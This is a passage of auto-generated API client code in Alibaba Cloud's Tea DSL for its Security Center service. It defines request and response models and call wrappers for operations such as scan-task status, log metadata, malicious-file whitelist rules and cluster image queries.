    result?: string(name='Result', description='The result of the scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.
*   **TASK_NOT_EXISTS**: The task does not exist.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task timed out.', example='SUCCESS'),
  }(name='TaskInfo', description='The information about the latest task.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model GetLastOnceTaskInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetLastOnceTaskInfoResponseBody(name='body'),
}

/**
 * @summary Queries information about the latest scan task to determine whether the task is complete.
 *
 * @param request GetLastOnceTaskInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetLastOnceTaskInfoResponse
 */
async function getLastOnceTaskInfoWithOptions(request: GetLastOnceTaskInfoRequest, runtime: Util.RuntimeOptions): GetLastOnceTaskInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLastOnceTaskInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the latest scan task to determine whether the task is complete.
 *
 * @param request GetLastOnceTaskInfoRequest
 * @return GetLastOnceTaskInfoResponse
 */
async function getLastOnceTaskInfo(request: GetLastOnceTaskInfoRequest): GetLastOnceTaskInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLastOnceTaskInfoWithOptions(request, runtime);
}

model GetLocalDefaultRegionRequest {
  vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud.
*   **HUAWEICLOUD**: Huawei Cloud.
*   **Azure**: Microsoft Azure.
*   **AWS**: Amazon Web Services (AWS).', example='Tencent'),
}

model GetLocalDefaultRegionResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F6D23860-55C2-55AA-B484-****'),
  status?: int32(name='Status', description='The access type of the multi-cloud site. Valid values:

*   **0**: The current site is not the default site of the multi-cloud site. You can specify a site as the default site of the multi-cloud site.
*   **1**: The current site is the default site of the multi-cloud site.
*   **2**: Another site is set as the default site of the multi-cloud site.', example='1'),
}

model GetLocalDefaultRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetLocalDefaultRegionResponseBody(name='body'),
}

/**
 * @summary Obtains the default region for synchronizing assets outside Alibaba Cloud.
 *
 * @param request GetLocalDefaultRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetLocalDefaultRegionResponse
 */
async function getLocalDefaultRegionWithOptions(request: GetLocalDefaultRegionRequest, runtime: Util.RuntimeOptions): GetLocalDefaultRegionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLocalDefaultRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the default region for synchronizing assets outside Alibaba Cloud.
 *
 * @param request GetLocalDefaultRegionRequest
 * @return GetLocalDefaultRegionResponse
 */
async function getLocalDefaultRegion(request: GetLocalDefaultRegionRequest): GetLocalDefaultRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLocalDefaultRegionWithOptions(request, runtime);
}

model GetLogMetaRequest {
  logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the name of the Logstore.

This parameter is required.', example='aegis-log-login'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
}

model GetLogMetaResponseBody = {
  logMeta?: {
    logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
    project?: string(name='Project', description='The Simple Log Service project.', example='sas-log'),
    status?: string(name='Status', description='The status of a data shipping task of a log. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
  }(name='LogMeta', description='The data of a data shipping task.'),
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model GetLogMetaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetLogMetaResponseBody(name='body'),
}

/**
 * @summary Queries the status of a data shipping task of a log.
 *
 * @param request GetLogMetaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetLogMetaResponse
 */
async function getLogMetaWithOptions(request: GetLogMetaRequest, runtime: Util.RuntimeOptions): GetLogMetaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.logStore)) {
    query['LogStore'] = request.logStore;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLogMeta',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status of a data shipping task of a log.
 *
 * @param request GetLogMetaRequest
 * @return GetLogMetaResponse
 */
async function getLogMeta(request: GetLogMetaRequest): GetLogMetaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLogMetaWithOptions(request, runtime);
}

model GetMaliciousFileWhitelistConfigRequest {
  configId?: long(name='ConfigId', description='The ID of the whitelist rule.', example='1'),
}

model GetMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    count?: string(name='Count', description='The number of assets on which the whitelist rule takes effect.

>  The value of this parameter is returned only if the value of TargetType is SELECTION_KEY.', example='0'),
    eventName?: string(name='EventName', description='The name of the alert.

*   The value is fixed as ALL, which indicates all alert types.', example='ALL'),
    field?: string(name='Field', description='The field that is used in the whitelist rule.', example='fileMd5'),
    fieldValue?: string(name='FieldValue', description='The value of the field that is used in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
    gmtCreate?: string(name='GmtCreate', description='The creation time.', example='1671607025000'),
    gmtModified?: string(name='GmtModified', description='The modification time.', example='1674095396000'),
    id?: long(name='Id', description='The ID of the whitelist rule.', example='1'),
    operator?: string(name='Operator', description='The logical operator that is used in the whitelist rule.

*   The value is fixed as strEqual, which indicates the equality operator (=).', example='strEqual'),
    source?: string(name='Source', description='The feature to which this operation belongs.

*   The value is fixed as agentless, which indicates the agentless detection feature.', example='agentless'),
    targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
    targetValue?: string(name='TargetValue', description='The assets on which the whitelist rule takes effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
  }(name='Data', description='The response parameters.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The value 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Queries an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request GetMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetMaliciousFileWhitelistConfigResponse
 */
async function getMaliciousFileWhitelistConfigWithOptions(request: GetMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): GetMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetMaliciousFileWhitelistConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request GetMaliciousFileWhitelistConfigRequest
 * @return GetMaliciousFileWhitelistConfigResponse
 */
async function getMaliciousFileWhitelistConfig(request: GetMaliciousFileWhitelistConfigRequest): GetMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model GetModuleConfigRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
}

model GetModuleConfigResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The response code returned.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group to which the server belongs.', example='5562414'),
          instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', description='The instance name of the server.', example='inStanceName****'),
          ip?: string(name='Ip', description='The IP address of the server.', example='2.2.X.X'),
          region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items', description='An array that consists of the configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations of the module.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='100'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful.', example='true'),
}

model GetModuleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetModuleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of a module.
 *
 * @param request GetModuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetModuleConfigResponse
 */
async function getModuleConfigWithOptions(request: GetModuleConfigRequest, runtime: Util.RuntimeOptions): GetModuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of a module.
 *
 * @param request GetModuleConfigRequest
 * @return GetModuleConfigResponse
 */
async function getModuleConfig(request: GetModuleConfigRequest): GetModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleConfigWithOptions(request, runtime);
}

model GetModuleConfigStatusRequest {
  moduleNames?: [ string ](name='ModuleNames', description='The service modules that you want to query.

This parameter is required.'),
}

model GetModuleConfigStatusShrinkRequest {
  moduleNamesShrink?: string(name='ModuleNames', description='The service modules that you want to query.

This parameter is required.'),
}

model GetModuleConfigStatusResponseBody = {
  data?: {
    moduleConfigResults?: [ 
      {
        moduleName?: string(name='ModuleName', description='The name of the check item. Valid values:

*   **Ransom**: The anti-ransomware policy is enabled.
*   **WebLock**: The web tamper proofing feature is enabled.
*   **Rasp**: Applications are added to the application protection feature.
*   **Image**: The container images that can be scanned are specified.
*   **Virus**: The periodic virus scan policy is enabled.', example='Ransom'),
        pass?: boolean(name='Pass', description='Indicates whether the service module passed the status check. Valid values:

*   **true**
*   **false**', example='true'),
      }
    ](name='ModuleConfigResults', description='The check results of the service modules.'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='843E4805-****-7EE12FA8DBFD'),
}

model GetModuleConfigStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetModuleConfigStatusResponseBody(name='body'),
}

/**
 * @summary Checks whether the purchased Security Center features are enabled and whether related configurations take effect.
 *
 * @param tmpReq GetModuleConfigStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetModuleConfigStatusResponse
 */
async function getModuleConfigStatusWithOptions(tmpReq: GetModuleConfigStatusRequest, runtime: Util.RuntimeOptions): GetModuleConfigStatusResponse {
  Util.validateModel(tmpReq);
  var request = new GetModuleConfigStatusShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.moduleNames)) {
    request.moduleNamesShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.moduleNames, 'ModuleNames', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.moduleNamesShrink)) {
    query['ModuleNames'] = request.moduleNamesShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleConfigStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether the purchased Security Center features are enabled and whether related configurations take effect.
 *
 * @param request GetModuleConfigStatusRequest
 * @return GetModuleConfigStatusResponse
 */
async function getModuleConfigStatus(request: GetModuleConfigStatusRequest): GetModuleConfigStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleConfigStatusWithOptions(request, runtime);
}

model GetModuleTrialAuthInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  moduleCode?: string(name='ModuleCode', description='The code of the feature. Valid values:

*   **vulFix**: vulnerability fixing.
*   **cloudSiem**: threat analysis and response.', example='vulFix'),
}

model GetModuleTrialAuthInfoResponseBody = {
  data?: {
    canTry?: boolean(name='CanTry', description='Indicates whether the user is qualified for the trial use. Valid values:

*   **true**
*   **false**', example='false'),
    moduleCode?: string(name='ModuleCode', description='The code of the feature. Valid values:

*   **vulFix**: vulnerability fixing.
*   **cloudSiem**: threat analysis and response.', example='vulFix'),
    trialRecordList?: [ 
      {
        authLimit?: long(name='AuthLimit', description='The quota.', example='100'),
        authLimitList?: string(name='AuthLimitList', description='The list of quotas. This parameter is available if the value of the ModuleCode parameter is cloudSiem. The value of this parameter consists of the log storage capacity for the threat analysis and response feature and the log data to add. Units: GB and GB-day.', example='[1,100]'),
        gmtEnd?: long(name='GmtEnd', description='The end time of the trial use.', example='1679760000000'),
        gmtStart?: long(name='GmtStart', description='The start time of the trial use.', example='1669824000000'),
        moduleCode?: string(name='ModuleCode', description='The code of the feature. Valid values:

*   **vulFix**: vulnerability fixing.
*   **cloudSiem**: threat analysis and response.', example='vulFix'),
        status?: int32(name='Status', description='The status of the trial use. Valid values:

*   **1**: The feature is in trial use.
*   **0**: The trial use ends.', example='1'),
      }
    ](name='TrialRecordList', description='The trial use record.'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model GetModuleTrialAuthInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetModuleTrialAuthInfoResponseBody(name='body'),
}

/**
 * @summary Queries the qualification information about the trial use of Security Center value-added features, including vulnerability fixing and threat analysis and response.
 *
 * @param request GetModuleTrialAuthInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetModuleTrialAuthInfoResponse
 */
async function getModuleTrialAuthInfoWithOptions(request: GetModuleTrialAuthInfoRequest, runtime: Util.RuntimeOptions): GetModuleTrialAuthInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.moduleCode)) {
    query['ModuleCode'] = request.moduleCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleTrialAuthInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the qualification information about the trial use of Security Center value-added features, including vulnerability fixing and threat analysis and response.
 *
 * @param request GetModuleTrialAuthInfoRequest
 * @return GetModuleTrialAuthInfoResponse
 */
async function getModuleTrialAuthInfo(request: GetModuleTrialAuthInfoRequest): GetModuleTrialAuthInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleTrialAuthInfoWithOptions(request, runtime);
}

model GetObjectScanEventRequest {
  eventId?: string(name='EventId', description='The ID of the alert event.', example='81****'),
  lang?: string(name='Lang', description='The language of the content in the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model GetObjectScanEventResponseBody = {
  data?: {
    details?: [ 
      {
        infoType?: string(name='InfoType', description='The type of the item.', example='html'),
        name?: string(name='Name', description='The name of the item.', example='DownloadUrl'),
        nameDisplay?: string(name='NameDisplay', description='The display name of the item.', example='DownloadUrl'),
        type?: string(name='Type', description='The type of the item.', example='html'),
        value?: string(name='Value', description='The value of the item.', example='http://****'),
        valueDisplay?: string(name='ValueDisplay', description='The display value of the item.', example='http://****'),
      }
    ](name='Details', description='The details of the alert event.'),
    eventName?: string(name='EventName', description='The name of the alert item.', example='WebShell'),
    fileName?: string(name='FileName', description='The name of the object.', example='sca_2023****'),
    md5?: string(name='Md5', description='The MD5 hash value of the object.', example='0552c44e243abdea1729d4507bce****'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetObjectScanEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetObjectScanEventResponseBody(name='body'),
}

/**
 * @summary Queries the details of an alert event that is generated for a malicious object.
 *
 * @param request GetObjectScanEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetObjectScanEventResponse
 */
async function getObjectScanEventWithOptions(request: GetObjectScanEventRequest, runtime: Util.RuntimeOptions): GetObjectScanEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetObjectScanEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an alert event that is generated for a malicious object.
 *
 * @param request GetObjectScanEventRequest
 * @return GetObjectScanEventResponse
 */
async function getObjectScanEvent(request: GetObjectScanEventRequest): GetObjectScanEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return getObjectScanEventWithOptions(request, runtime);
}

model GetOnceTaskResultInfoRequest {
  taskId?: string(name='TaskId', description='The ID of the scan task.

This parameter is required.', example='9dfa3a7eb9547781632785b49003****'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task of asset information collection

This parameter is required.', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task of asset information collection

This parameter is required.', example='ASSETS_COLLECTION'),
}

model GetOnceTaskResultInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The execution time of the task.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', description='The number of tasks that were completed.', example='47'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  taskId?: long(name='TaskId', description='The ID of the scan task.', example='e7b70a4b030db086db52231f1b58****'),
  taskInfo?: {
    status?: string(name='Status', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task times out.', example='START'),
  }(name='TaskInfo', description='The information about the task.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model GetOnceTaskResultInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOnceTaskResultInfoResponseBody(name='body'),
}

/**
 * @summary Queries the execution result of a one-time scan task, such as asset fingerprint collection, vulnerability scan, and image security scan.
 *
 * @param request GetOnceTaskResultInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOnceTaskResultInfoResponse
 */
async function getOnceTaskResultInfoWithOptions(request: GetOnceTaskResultInfoRequest, runtime: Util.RuntimeOptions): GetOnceTaskResultInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOnceTaskResultInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the execution result of a one-time scan task, such as asset fingerprint collection, vulnerability scan, and image security scan.
 *
 * @param request GetOnceTaskResultInfoRequest
 * @return GetOnceTaskResultInfoResponse
 */
async function getOnceTaskResultInfo(request: GetOnceTaskResultInfoRequest): GetOnceTaskResultInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOnceTaskResultInfoWithOptions(request, runtime);
}

model GetOpaClusterBaseLineListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      alias?: string(name='Alias', description='The alias of the baseline.', example='Make sure there are no duplicate usernames or UIDs'),
      classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
      itemKey?: string(name='ItemKey', description='The key of the name for the baseline check item.', example='duplicate_uid'),
      nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
    }
  ](name='Data', description='The information about baselines.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='C2F2A020-1CAB-5F52-8CAF-B2ACDDFAC247'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterBaseLineListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaClusterBaseLineListResponseBody(name='body'),
}

/**
 * @summary Queries the baselines that are supported by at-risk image blocking.
 *
 * @param request GetOpaClusterBaseLineListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaClusterBaseLineListResponse
 */
async function getOpaClusterBaseLineListWithOptions(runtime: Util.RuntimeOptions): GetOpaClusterBaseLineListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetOpaClusterBaseLineList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the baselines that are supported by at-risk image blocking.
 *
 * @return GetOpaClusterBaseLineListResponse
 */
async function getOpaClusterBaseLineList(): GetOpaClusterBaseLineListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaClusterBaseLineListWithOptions(runtime);
}

model GetOpaClusterImageListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  imageName?: string(name='ImageName', description='The name of the image.', example='testImage'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='1'),
}

model GetOpaClusterImageListResponseBody = {
  code?: string(name='Code', description='The response code. The status code 200 indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images returned on the current page.', example='1'),
  data?: [ 
    {
      imageName?: string(name='ImageName', description='The name of the image.', example='opa-test'),
    }
  ](name='Data', description='The information about the images.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='0D02F593-2050-5F5D-8C98-D965FF1B461D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterImageListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaClusterImageListResponseBody(name='body'),
}

/**
 * @summary 查询集群镜像
 *
 * @param request GetOpaClusterImageListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaClusterImageListResponse
 */
async function getOpaClusterImageListWithOptions(request: GetOpaClusterImageListRequest, runtime: Util.RuntimeOptions): GetOpaClusterImageListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
